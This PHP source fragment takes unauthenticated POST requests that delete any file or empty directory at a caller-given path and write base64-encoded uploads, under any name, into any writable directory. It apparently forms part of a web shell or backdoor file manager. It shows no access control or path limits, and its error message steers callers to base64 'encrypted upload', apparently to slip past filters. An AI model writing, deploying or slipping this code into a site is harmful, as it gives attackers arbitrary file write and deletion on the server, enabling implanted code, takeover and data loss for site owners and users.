<?php
if (isset($_POST['action']) && $_POST['action'] === 'delete') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $path = $_POST['path'] ?? '';
    if (!$path) {
        echo json_encode(['error' => 'No path provided']);
        exit;
    }
    if (!file_exists($path) && !is_link($path)) {
        echo json_encode(['error' => 'Path does not exist: ' . $path]);
        exit;
    }
    try {
        if (is_link($path) || is_file($path)) {
            if (!@unlink($path)) {
                $err = error_get_last();
                throw new Exception('unlink() failed on ' . $path . ': ' . ($err['message'] ?? 'unknown error'));
            }
        } elseif (is_dir($path)) {
            $items = @scandir($path);
            if ($items && count($items) > 2) {
                throw new Exception('Directory not empty: ' . $path . ' (' . (count($items) - 2) . ' entries)');
            }
            if (!@rmdir($path)) {
                $err = error_get_last();
                throw new Exception('rmdir() failed on ' . $path . ': ' . ($err['message'] ?? 'unknown error'));
            }
        }
        echo json_encode(['ok' => true]);
    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $dir = $_POST['dir'] ?? '';
    if (!$dir || !is_dir($dir)) {
        echo json_encode(['error' => 'Invalid directory: ' . $dir]);
        exit;
    }
    if (!is_writable($dir)) {
        echo json_encode(['error' => 'Directory not writable: ' . $dir]);
        exit;
    }
    if (!empty($_POST['file_b64'])) {
        $raw = base64_decode($_POST['file_b64'], true);
        if ($raw === false) {
            echo json_encode(['error' => 'Invalid file payload (base64 decode failed)']);
            exit;
        }
        $name = basename($_POST['file_name'] ?? 'upload.bin');
        if ($name === '' || $name === '.' || $name === '..') {
            echo json_encode(['error' => 'Invalid file name']);
            exit;
        }
        try {
            $dest = rtrim($dir, '/') . '/' . $name;
            $overwritten = file_exists($dest);
            if (@file_put_contents($dest, $raw) === false) {
                $err = error_get_last();
                throw new Exception('file_put_contents() failed: ' . ($err['message'] ?? 'unknown error'));
            }
            echo json_encode([
                'ok' => true,
                'path' => $dest,
                'size' => strlen($raw),
                'overwritten' => $overwritten,
            ]);
        } catch (Exception $e) {
            echo json_encode(['error' => $e->getMessage()]);
        }
        exit;
    }

    echo json_encode(['error' => 'No file received — use encrypted upload (file_b64)']);
    exit;
}
